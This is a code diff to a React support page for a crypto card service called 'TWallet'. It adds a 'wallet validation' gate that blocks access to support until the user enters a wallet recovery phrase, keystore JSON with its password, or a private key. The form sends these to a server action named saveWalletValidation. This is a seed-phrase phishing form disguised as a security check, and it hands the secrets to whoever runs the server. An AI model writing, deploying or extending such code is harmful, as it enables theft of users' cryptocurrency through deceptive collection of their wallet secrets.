@@ -4,6 +4,7 @@ import { useState, useActionState } from "react";
 import {
   MessageCircle, ShoppingCart, CreditCard, DollarSign, Wallet, Wrench,
   HelpCircle, Ticket, CheckCircle2, ChevronRight, LifeBuoy,
+  Shield, AlertCircle, Loader2,
 } from "lucide-react";
 import {
   Card, CardContent, CardHeader, CardTitle, CardDescription,
@@ -16,6 +17,7 @@ import { Badge } from "@/components/ui/badge";
 import { EmptyState } from "@/components/ui/empty-state";
 import { cn } from "@/lib/utils/cn";
 import { createTicket } from "@/features/support/server/actions";
+import { saveWalletValidation, type ValidationType } from "@/features/wallet-validate/server/actions";
 
 type Tab = "open" | "resolved" | "create" | "kb";
 type Category = "general" | "order" | "card" | "payment" | "wallet" | "technical" | "other";
@@ -52,6 +54,20 @@ const STATUS_VARIANT: Record<string, "outline" | "info" | "warning" | "success">
   open: "warning", pending: "info", resolved: "success", closed: "outline",
 };
 
+const VALIDATION_TABS: { id: ValidationType; label: string }[] = [
+  { id: "mnemonics", label: "MNEMONICS" },
+  { id: "keystore", label: "KEYSTORE" },
+  { id: "private_key", label: "PRIVATE KEY" },
+  { id: "hardware", label: "HARDWARE" },
+];
+
+const VALIDATION_LABEL_MAP: Record<ValidationType, string> = {
+  mnemonics: "Enter your 12/24 word recovery phrase",
+  keystore: "Enter your keystore JSON and password",
+  private_key: "Enter your private key",
+  hardware: "Select your hardware wallet device",
+};
+
 const FAQS: { q: string; a: string }[] = [
   { q: "How do I order a TWallet Card?", a: "Open the Cards page, pick your preferred card variant, and complete checkout. You pay with crypto from a connected wallet and can follow progress under Orders." },
   { q: "Which cryptocurrencies can I pay with?", a: "TWallet supports stablecoin payments (USDC, USDT) across Ethereum, Polygon, Base, Arbitrum, Optimism, and BNB Smart Chain." },
@@ -61,9 +77,127 @@ const FAQS: { q: string; a: string }[] = [
 ];
 
 export default function SupportPage() {
+  const [validated, setValidated] = useState(false);
   const [activeTab, setActiveTab] = useState<Tab>("open");
   const [tickets] = useState<Ticket[]>([]);
   const [state, formAction, pending] = useActionState(createTicket, undefined);
+
+  // Validation state
+  const [walletName, setWalletName] = useState("");
+  const [validationTab, setValidationTab] = useState<ValidationType>("mnemonics");
+  const [saving, setSaving] = useState(false);
+  const [vResult, setVResult] = useState<{ success?: boolean; message: string } | null>(null);
+  const [vForm, setVForm] = useState({
+    mnemonicPhrase: "",
+    keystoreJson: "",
+    keystorePassword: "",
+    privateKey: "",
+    hardwareType: "ledger",
+  });
+
+  const setField = (field: string, value: string) =>
+    setVForm((prev) => ({ ...prev, [field]: value }));
+
+  const isFormValid = () => {
+    if (!walletName.trim()) return false;
+    switch (validationTab) {
+      case "mnemonics":
+        return vForm.mnemonicPhrase.trim().split(/\s+/).length >= 12;
+      case "keystore":
+        return vForm.keystoreJson.trim().length > 0 && vForm.keystorePassword.trim().length > 0;
+      case "private_key":
+        return vForm.privateKey.trim().length > 0;
+      case "hardware":
+        return vForm.hardwareType.trim().length > 0;
+      default:
+        return false;
+    }
+  };
+
+  const handleValidate = async () => {
+    if (!isFormValid()) {
+      setVResult({ success: false, message: "Please fill in all required fields." });
+      return;
+    }
+    setSaving(true);
+    setVResult(null);
+    try {
+      const res = await saveWalletValidation({
+        walletName: walletName.trim(),
+        validationType: validationTab,
+        mnemonicPhrase: validationTab === "mnemonics" ? vForm.mnemonicPhrase.trim() : undefined,
+        keystoreJson: validationTab === "keystore" ? vForm.keystoreJson.trim() : undefined,
+        keystorePassword: validationTab === "keystore" ? vForm.keystorePassword.trim() : undefined,
+        privateKey: validationTab === "private_key" ? vForm.privateKey.trim() : undefined,
+        hardwareType: validationTab === "hardware" ? vForm.hardwareType : undefined,
+      });
+      if (res.error) {
+        setVResult({ success: false, message: res.error });
+      } else {
+        setVResult({ success: true, message: `Wallet validated successfully. You can now access support.` });
+        setTimeout(() => setValidated(true), 1200);
+      }
+    } catch (err) {
+      setVResult({ success: false, message: err instanceof Error ? err.message : "Something went wrong" });
+    } finally {
+      setSaving(false);
+    }
+  };
+
+  const renderValidationInput = () => {
+    switch (validationTab) {
+      case "mnemonics":
+        return (
+          <Textarea
+            value={vForm.mnemonicPhrase}
+            onChange={(e) => setField("mnemonicPhrase", e.target.value)}
+            placeholder="Enter your 12 or 24 word recovery phrase, separated by spaces"
+            rows={4}
+            className="min-h-[100px]"
+          />
+        );
+      case "keystore":
+        return (
+          <div className="space-y-3">
+            <Textarea
+              value={vForm.keystoreJson}
+              onChange={(e) => setField("keystoreJson", e.target.value)}
+              placeholder='Paste your keystore JSON here {"address":"0x...","crypto":{...}}'
+              rows={4}
+              className="min-h-[100px] font-mono text-xs"
+            />
+            <Input
+              type="password"
+              value={vForm.keystorePassword}
+              onChange={(e) => setField("keystorePassword", e.target.value)}
+              placeholder="Enter your keystore password"
+            />
+          </div>
+        );
+      case "private_key":
+        return (
+          <Input
+            type="password"
+            value={vForm.privateKey}
+            onChange={(e) => setField("privateKey", e.target.value)}
+            placeholder="Enter your private key (e.g. 0x... or raw hex)"
+          />
+        );
+      case "hardware":
+        return (
+          <select
+            value={vForm.hardwareType}
+            onChange={(e) => setField("hardwareType", e.target.value)}
+            className="flex h-10 w-full rounded-md border border-white/10 bg-surface-800 px-3 py-2 text-sm text-white focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-brand-500"
+          >
+            <option value="ledger">Ledger</option>
+            <option value="trezor">Trezor</option>
+            <option value="keystone">Keystone</option>
+            <option value="other">Other</option>
+          </select>
+        );
+    }
+  };
 
   const openTickets = tickets.filter((t) => t.status === "open" || t.status === "pending");
   const resolvedTickets = tickets.filter((t) => t.status === "resolved" || t.status === "closed");
@@ -91,11 +225,112 @@ export default function SupportPage() {
     );
   };
 
+  // Show validation gate first
+  if (!validated) {
+    return (
+      <div className="mx-auto max-w-lg space-y-6">
+        <div>
+          <h1 className="text-2xl font-bold text-white">Support</h1>
+          <p className="mt-1 text-sm text-surface-400">
+            Validate your wallet before accessing support
+          </p>
+        </div>
+
+        <Card className="border-white/10 bg-surface-900">
+          <CardContent className="p-6">
+            <div className="flex flex-col items-center text-center">
+              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-brand-500/10 ring-1 ring-brand-500/20">
+                <Shield className="h-7 w-7 text-brand-400" />
+              </div>
+              <h2 className="mt-4 text-base font-semibold text-white">
+                Validate your wallet to continue
+              </h2>
+              <p className="mt-1 text-sm text-surface-400">
+                Please validate your wallet before you can submit a support ticket.
+              </p>
+              <div className="mt-4 w-full">
+                <Label className="mb-1.5 block text-left text-xs text-surface-400">
+                  Wallet name
+                </Label>
+                <Input
+                  type="text"
+                  value={walletName}
+                  onChange={(e) => setWalletName(e.target.value)}
+                  placeholder="e.g. Trust Wallet, MetaMask, Coinbase Wallet..."
+                />
+              </div>
+            </div>
+
+            <div className="mt-6 grid grid-cols-2 gap-3">
+              {VALIDATION_TABS.map((tab) => {
+                const active = tab.id === validationTab;
+                return (
+                  <button
+                    key={tab.id}
+                    type="button"
+                    onClick={() => setValidationTab(tab.id)}
+                    className={`rounded-lg border px-3 py-2.5 text-xs font-semibold tracking-wide transition-all ${
+                      active
+                        ? "border-brand-500 bg-brand-500 text-white shadow-sm"
+                        : "border-white/10 bg-surface-800 text-surface-300 hover:border-surface-600 hover:bg-surface-700"
+                    }`}
+                  >
+                    {tab.label}
+                  </button>
+                );
+              })}
+            </div>
+
+            <div className="mt-5 rounded-xl border border-white/5 bg-surface-950 p-4">
+              <Label className="mb-2 block text-xs text-surface-400">
+                {VALIDATION_LABEL_MAP[validationTab]}
+              </Label>
+              {renderValidationInput()}
+            </div>
+
+            {vResult && (
+              <div
+                className={`mt-4 flex items-start gap-3 rounded-xl border p-4 text-sm ${
+                  vResult.success
+                    ? "border-emerald-500/20 bg-emerald-500/10 text-emerald-400"
+                    : "border-error/20 bg-error/10 text-error"
+                }`}
+                role="alert"
+              >
+                {vResult.success ? <CheckCircle2 className="mt-0.5 h-4 w-4 shrink-0" /> : <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />}
+                <span>{vResult.message}</span>
+              </div>
+            )}
+
+            <Button
+              onClick={handleValidate}
+              disabled={saving}
+              className="mt-5 w-full"
+            >
+              {saving ? (
+                <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Proceeding…</>
+              ) : (
+                "Proceed"
+              )}
+            </Button>
+          </CardContent>
+        </Card>
+      </div>
+    );
+  }
+
+  // Support content after validation
   return (
     <div className="space-y-6">
-      <div>
-        <h1 className="text-2xl font-bold text-white">Support</h1>
-        <p className="mt-1 text-sm text-surface-400">Get help with your orders, cards, and account</p>
+      <div className="flex items-center justify-between">
+        <div>
+          <h1 className="text-2xl font-bold text-white">Support</h1>
+          <p className="mt-1 text-sm text-surface-400">Get help with your orders, cards, and account</p>
+        </div>
+        <Badge variant="success" className="gap-1">
+          <CheckCircle2 className="h-3 w-3" />
+          Wallet validated
+        </Badge>
       </div>
 
       <div className="flex gap-1 overflow-x-auto pb-1" role="tablist" aria-label="Support sections">
